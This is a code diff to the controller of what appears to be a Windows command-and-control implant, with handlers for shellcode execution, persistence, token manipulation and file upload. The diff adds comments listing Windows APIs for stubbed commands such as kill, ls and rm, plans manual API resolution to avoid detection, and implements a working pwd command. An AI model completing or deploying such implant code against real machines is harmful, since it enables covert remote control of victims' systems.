@@ -90,7 +90,6 @@ void Controller::handleExecuteCommand(const InternalMessage& msg)
 	messageHandler_->sendMessage(outMsg);
 }
 
-// TODO: figure out why this crashes the program
 void Controller::handleExecuteShellcode(const InternalMessage& msg)
 {
 	std::cout << "Controller::handleExecuteShellcode()" << std::endl;
@@ -303,6 +302,8 @@ void Controller::handleEstablishPersistence(const InternalMessage& msg)
 
 
 // TODO: need to resolve all api calls used in this function
+// TODO: add ability to upload file in chunks
+// TODO: use CreateFileA + WriteFile instead of fopen_s + fwrite
 // Purpose: Send a client-side file to the server.
 void Controller::handleUpload(const InternalMessage& msg)
 {
@@ -461,12 +462,15 @@ void Controller::handleCd(const InternalMessage& msg)
 // Intended purpose: Copy a file or directory to another client-side path.
 void Controller::handleCp(const InternalMessage& msg)
 {
+    // CopyFileA
     sendNotImplemented(msg, "cp");
 }
 
 // Intended purpose: List the drives and mounted volumes visible to the client.
 void Controller::handleDrives(const InternalMessage& msg)
 {
+    // GetLogicalDrives
+    // GetDriveTypeA
     sendNotImplemented(msg, "drives");
 }
 
@@ -485,6 +489,7 @@ void Controller::handleGetPrivs(const InternalMessage& msg)
 // Intended purpose: Report the user identity under which the client is running.
 void Controller::handleGetUid(const InternalMessage& msg)
 {
+    // GetTokenInformation
     sendNotImplemented(msg, "getuid");
 }
 
@@ -515,6 +520,9 @@ void Controller::handleJobKill(const InternalMessage& msg)
 // Intended purpose: Terminate a selected process on the client.
 void Controller::handleKill(const InternalMessage& msg)
 {
+    // PID
+    // OpenProcess/NtOpenProcess
+    // TerminateProcess/NtTerminateProcess
     sendNotImplemented(msg, "kill");
 }
 
@@ -527,6 +535,10 @@ void Controller::handleLink(const InternalMessage& msg)
 // Intended purpose: List the files and directories at a client-side path.
 void Controller::handleLs(const InternalMessage& msg)
 {
+    // GetFileAttributesA - check if path is valid
+    // FindFirstFileA - find file in dir
+    // FindNextFileA - find next file in dir
+    // FindClose - close handle created by FindFirstFileA
     sendNotImplemented(msg, "ls");
 }
 
@@ -539,12 +551,14 @@ void Controller::handleMakeToken(const InternalMessage& msg)
 // Intended purpose: Create a directory on the client.
 void Controller::handleMkdir(const InternalMessage& msg)
 {
+    // CreateDirectoryA / NtCreateFile with the FILE_DIRECTORY_FILE
     sendNotImplemented(msg, "mkdir");
 }
 
 // Intended purpose: Move or rename a file or directory on the client.
 void Controller::handleMv(const InternalMessage& msg)
 {
+    // MoveFileA
     sendNotImplemented(msg, "mv");
 }
 
@@ -563,7 +577,28 @@ void Controller::handlePs(const InternalMessage& msg)
 // Intended purpose: Report the client working directory.
 void Controller::handlePwd(const InternalMessage& msg)
 {
-    sendNotImplemented(msg, "pwd");
+
+    std::string path(MAX_PATH, '\0');
+
+    // TODO: should manual resolve this api and use that version instead
+    DWORD length = GetCurrentDirectoryA(static_cast<DWORD>(path.size()), path.data());
+
+    if (length > 0 && length < path.size())
+    {
+        path.resize(length);
+    }
+    else
+    {
+        // TODO: throw error... messageType == ERROR_RESULT
+        std::cout << "error message here: todo" << std::endl;
+    }
+
+    InternalMessage response;
+    response.header_.messageType_ = MessageType::PWD;
+    response.header_.messageId_ = msg.header_.messageId_;
+    response.data_.assign(path.begin(), path.end());
+    response.header_.dataSize_ = static_cast<uint32_t>(response.data_.size());
+    messageHandler_->sendMessage(response);
 }
 
 // Intended purpose: List the subkeys and values of a Windows registry key.
@@ -587,6 +622,9 @@ void Controller::handleRev2Self(const InternalMessage& msg)
 // Intended purpose: Remove a file or directory from the client.
 void Controller::handleRm(const InternalMessage& msg)
 {
+    // GetFileAttributesA - see if path/file is valid and if it's a dir or file
+    // DeleteFileA - deletes file
+    // RemoveDirectoryA - deletes EMPTY directory
     sendNotImplemented(msg, "rm");
 }
 
